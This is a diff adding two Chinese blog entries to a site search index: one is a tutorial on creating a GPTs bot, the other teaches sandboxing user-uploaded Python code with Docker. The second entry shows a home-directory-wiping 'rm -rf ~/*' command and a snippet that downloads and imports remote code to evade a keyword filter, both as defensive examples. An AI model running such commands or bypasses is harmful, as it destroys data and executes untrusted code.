@@ -10982,4 +10982,75 @@ llo
         <tag>爬虫</tag>
       </tags>
   </entry>
+  <entry>
+    <title>老板让我加班怎么办？GPTs创建机器人实战</title>
+    <url>/2023/11/11/gpts/</url>
+    <content><![CDATA[<p>前两天的OpenAI发布会，相信很多同学看完以后都热血沸腾。我之前一直使用的是ChatGPT的免费版本，看完这个发布会以后，立刻就充值了ChatGPT Plus，来试一试这些高级功能。</p>
+<p>这两天GPTs功能上线了，短短三天时间，全球网友创建了几千个GPT机器人。我今天也来搞一个玩玩。</p>
+<p>使用GPTs创建机器人非常简单，不需要懂任何编程知识，甚至不需要懂Prompt工程，你只需要跟着他的向导，一步一步描述你的想法就可以了。</p>
+<span id="more"></span>
+
+<p>当我们成为了ChatGPT Plus会员以后，在ChatGPT页面会看到一个<code>Explore</code>的栏目，如下图所示。进入这个栏目，点击<code>Create a GPT</code>就可以开始创建自己的机器人了。</p>
+<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140708.png"></p>
+<p>在左侧，是机器人创建向导，它会首先让你描述一下，你想实现什么功能。这个地方不需要懂Prompt工程，你只需要像平时说话一样写出自己的需求就可以了。写中文或者英文都可以。如下图所示。</p>
+<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111142319.png"></p>
+<p>描述完成需求以后，他会给你建议一个机器人的名字，你要是觉得他取的名字不好，你也可以自己想一个，直接输入到对话框中。</p>
+<p>设置完成名字以后，他会自动给机器人生成头像。头像生成完成以后，会针对需求的一些细节问题跟你进一步确认，例如“当老板的需求明显不合理时，你应该直白拒绝还是委婉提出”。</p>
+<p>你只需要一步一步跟着他的问题进行回复就可以了。我这个机器人创建完成，全程耗时大概10分钟左右。</p>
+<p>创建完成以后，点击右上角的“Save”就可以保存。然后跳转回聊天页面，如下图所示。</p>
+<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111135632.png"></p>
+<p>如果测试发现回答不好，可以在Explore页面编辑这个机器人，添加新的需求，如下图所示：</p>
+<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140147.png"></p>
+<p>下面是我的一些聊天记录，大家可以看看效果。</p>
+<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140305.png"></p>
+<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140412.png"></p>
+<p>在机器人的设置页面，进入<code>Configure</code>选项卡，可以看到机器人的配置信息，其中的Instructions，我理解才是真正的<code>Prompt</code>。它的内容，是GPT通过刚才跟你的一问一答，动态生成出来的。如果你会Prompt工程，你也可以直接在这里修改，速度更快。<br><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20231111140513.png"></p>
+<p><a href="https://chat.openai.com/g/g-Ru4uLNeoZ-ju-jue-gao-shou">Site Unreachable</a></p>
+]]></content>
+      <tags>
+        <tag>ChatGPT</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一日一技：如何安全运行别人上传的Python代码？</title>
+    <url>/2023/11/11/python-run-other-code/</url>
+    <content><![CDATA[<p>写后端的同学，有时候需要在网站上实现一个功能，让用户上传或者编写自己的Python代码。后端再运行这些代码。</p>
+<p>涉及到用户自己上传代码，我们第一个想到的问题，就是如何避免用户编写危险命令。如果用户的代码里面涉及到下面两行，在不做任何安全过滤的情况下，就会导致服务器的Home文件夹被清空。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;rm -rf ~/*&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>有人想的比较简单，直接判断用户的代码里面有没有<code>os.system</code>、<code>exec</code>、<code>subprocess</code>……这些危险关键词不就可以了吗？</p>
+<p>这种想法乍看起来没有问题，但细想下，就会发现非常天真。如果用户的代码像下面这样写，你又要如何应对？</p>
+<span id="more"></span>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">code = requests.get(<span class="string">&#x27;https://www.kingname.info/dangerous_code&#x27;</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dangerous_code.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code)</span><br><span class="line"></span><br><span class="line">dangerous_module = <span class="built_in">__import__</span>(<span class="string">&#x27;dangerous_code&#x27;</span>)</span><br><span class="line">danderous_module.delete_all()</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>https://www.kingname.info/dangerous_code</code>对应的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_all</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;rm -rf ~/*&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以绕过关键字检查，并成功删除你的文件了。</p>
+<p>如果你的网站本身就是一个爬虫管理平台，你检查用户自定义的代码时，肯定不能过滤掉<code>requests</code>这种网络请求库。那么你就很难判断用户下载下来的东西是否包含恶意代码。</p>
+<p>而且恶意代码不一定是删除你的东西，它完全可以直接把你项目下面的所有代码打包，上传到它指定的URL中，这样就能窃取你网站里面所有代码。</p>
+<p>为了避免这样的情况发生，我们就必须找一个干净又独立的环境来运行用户的代码。干净的环境能确保恶意代码没有东西可以偷，独立的环境能确保他即使删除了所有文件，也不会影响到你。</p>
+<p>显然，最简单直接的办法，就是使用Docker来运行用户的代码。而使用Docker并不一定需要在终端使用Shell命令。我们可以使用Docker的Python SDK来实现构建镜像和运行镜像。</p>
+<p>首先，确保你的服务器上面已经有Docker，并且正在运行。接下来，安装Docker SDK：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install docker</span><br></pre></td></tr></table></figure>
+
+<p>假设，你把用户上传的文件放在了<code>user/&lt;user_id&gt;/upload</code>文件夹下面，那么，首先你需要生成一个Dockerfile，并把这个Dockerfile放到upload文件夹中：</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> python:<span class="number">3.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">run</span><span class="language-bash"> pip install -r requirements.txt</span></span><br><span class="line"><span class="keyword">copy</span><span class="language-bash"> . /app</span></span><br><span class="line"><span class="keyword">workdir</span><span class="language-bash"> /app</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户添加&#x2F;修改了第三方库时，你只需要更新requirements.txt即可让镜像里面的依赖符合用户的需求。</p>
+<p>接下来，我们开始构建镜像并运行代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line">client = docker.from_env()</span><br><span class="line"></span><br><span class="line">client.images.build(path=<span class="string">&#x27;user/&lt;user_id&gt;/upload&#x27;</span>, tag=<span class="string">&#x27;xxxspider:0.01&#x27;</span>) <span class="comment"># tag后面的名字可以自定义</span></span><br><span class="line"></span><br><span class="line">container = client.containers.run(<span class="string">&#x27;xxxspider:0.01&#x27;</span>, detach=<span class="literal">True</span>, command=<span class="string">&#x27;scrapy crawl xxx&#x27;</span>, 其他参数)</span><br></pre></td></tr></table></figure>
+
+<p>这个代码运行以后是非阻塞的，会立刻返回container对象。当你想查看代码日志时，执行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">container.logs(tail=<span class="number">10</span>) <span class="comment"># 显示最后10行日志</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以看到相关的日志了。</p>
+<p>关于Docker SDK的更多操作，可以看他的官方文档：<a href="https://docker-py.readthedocs.io/en/stable/index.html#docker-sdk-for-python">Docker SDK for Python — Docker SDK for Python 6.1.3 documentation</a></p>
+]]></content>
+      <tags>
+        <tag>Python</tag>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
 </search>
